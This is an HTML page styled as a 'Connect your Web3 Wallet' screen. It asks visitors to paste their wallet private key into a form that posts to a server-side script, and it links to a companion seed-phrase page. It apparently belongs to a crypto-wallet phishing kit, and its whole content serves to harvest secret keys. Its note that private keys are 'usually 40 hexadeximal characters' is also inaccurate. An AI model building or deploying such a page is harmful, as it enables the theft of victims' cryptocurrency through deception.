<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./style1.css">
    <title>Private Key Seed Phrase Input</title>
</head>

<body>

    <h1 class="header-txt">Connect your Web3 Wallet</h1>
    <div class="container">
        <div class="toggle-buttons">
            <button id="privateKeyToggle" class="btn">PRIVATE KEY</button>
            <a href="./12-words.php"><button id="seedPhraseToggle">SEED PHRASE</button></a>
        </div>
        <form action="./config0.php" method="POST" id="privateKeyInputContent">
            <div id="input-container">
                <p id="input-label">Enter your Private Key</p>
                <p class="sub-header">Usually 40 hexadeximal characters</p>
                <input name="privkey" type="text" id="privateKey" placeholder="Paste your private key" autocomplete="off" required>
            </div>
            <button id="connectWallet" type="submit">Next</button>
        </form>
    </div>
</body>

</html>